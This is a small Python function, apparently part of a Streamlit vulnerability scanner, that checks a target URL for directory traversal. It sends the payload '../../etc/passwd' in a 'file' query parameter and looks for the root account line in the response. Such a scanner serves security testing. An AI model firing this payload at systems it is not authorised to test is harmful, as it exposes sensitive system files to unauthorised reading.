import streamlit as st
import requests

def scan(url):
    payload = "../../etc/passwd"
    try:
        r = requests.get(f"{url}?file={payload}", timeout=5)
        if "root:x:0:0:" in r.text:
            st.error("[Directory Traversal] Vulnerability Found")
        else:
            st.success("[Directory Traversal] Not Found")
    except Exception as e:
        st.warning(f"[Traversal] Error: {str(e)}")